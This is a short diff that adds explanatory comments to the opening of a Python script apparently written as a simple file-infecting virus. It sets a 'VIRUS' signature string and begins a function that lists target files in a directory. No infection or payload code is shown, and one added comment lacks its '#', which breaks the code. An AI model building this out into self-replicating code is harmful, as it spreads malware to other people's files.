@@ -1,9 +1,12 @@
 #!/usr/bin/python
+# Load Python and import the OS and DATETIME Libraries
 import os
 import datetime
 
+# Define a variable named SIGNATURE and set it to VIRUS
 SIGNATURE = "VIRUS"
 
+Define a function
 def locate(path):
     files_targeted = []
     filelist = os.listdir(path)
